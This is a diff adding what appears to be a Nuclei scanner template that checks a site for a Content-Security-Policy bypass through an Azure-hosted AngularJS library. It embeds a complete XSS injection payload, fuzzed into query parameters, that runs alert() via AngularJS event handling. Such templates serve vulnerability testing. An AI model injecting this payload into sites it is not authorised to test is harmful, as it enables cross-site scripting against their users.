@@ -1,0 +1,55 @@
+id: azure-inno-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Azure Inno
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,azure-inno
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "azure.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: azure_inno_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "azure_inno_csp_xss == true"
+# digest: 4a0a00473045022100e4faa426b33485f1bc3751332fb4245eeaeb1f2e2100763a746b13f1150284dc02202f50ecaf16ae7ccb06caaa6bf05de832140d42fd849fb5d78080615c51e31ada:922c64590222798bb761d5b6d8e72950
